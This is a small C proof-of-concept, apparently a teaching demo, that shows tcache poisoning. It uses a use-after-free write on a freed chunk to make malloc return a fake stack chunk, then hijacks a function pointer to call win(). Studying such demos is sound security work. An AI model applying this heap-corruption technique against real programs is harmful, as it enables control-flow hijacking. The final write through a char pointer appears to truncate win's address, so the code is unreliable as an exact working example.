#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct chunk {
    size_t previous_size;
    size_t size;
    struct chunk *forward;
    struct chunk *backward;
    char buffer[10];
};

typedef struct victim_struct {
    void (* func_ptr)();
} victim_struct;

void lose() {
    printf(":(\n");
}

void win() {
    printf("You set up them the bomb.\n");
}

int main(int argc, char** argv) {
    struct chunk evil_chunk;
    evil_chunk.size = 0x20;
    char* data = (char *)&evil_chunk.forward;
    strcpy(data, "hello!");

    int allocsize = 0x10;
    char* ptrs[7];
    size_t i;
    for (i = 0; i < 7; i++) {
        ptrs[i] = malloc(allocsize);
    }

    // Fill the tcache.
    for (i = 0; i < 7; i++) {
        free(ptrs[i]);
    }
    char* a = malloc(10);
    printf("a: %p\n", a);

    free(a);

    *((unsigned long long *) a) = (unsigned long long) &evil_chunk.forward;

    a = malloc(10);

    victim_struct *victim = malloc(10);
    printf("fake chunk: %p\nmalloc'd: %p\n", &evil_chunk, victim);
    printf("victim data: %s\n", victim);
    printf("Setting function pointer to lose()\n");
    victim->func_ptr = lose;
    printf("Writing win() into the fake chunk\n\n");
    *data = (char*) win;

    printf("Calling function...\n\n");
    victim->func_ptr();
}